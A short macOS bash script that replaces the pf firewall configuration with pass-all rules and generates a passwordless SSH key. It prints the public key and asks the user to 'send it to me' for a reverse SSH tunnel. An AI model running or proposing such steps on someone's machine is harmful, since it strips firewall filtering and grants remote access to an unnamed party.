#!/bin/bash
set -e
echo "[1/2] Re-enabling pf with pass-all rules..."
sudo bash -c 'cat > /etc/pf.conf << PFEOF
pass in quick all
pass out all keep state
PFEOF'
sudo pfctl -e -f /etc/pf.conf 2>/dev/null || true
echo "[2/2] Setting up reverse SSH tunnel (Mac -> Server)..."
mkdir -p ~/.ssh
ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519 -N "" -q 2>/dev/null || true
echo ""
echo "=== COPY THIS KEY and send it to me ==="
cat ~/.ssh/id_ed25519.pub
echo "========================================"
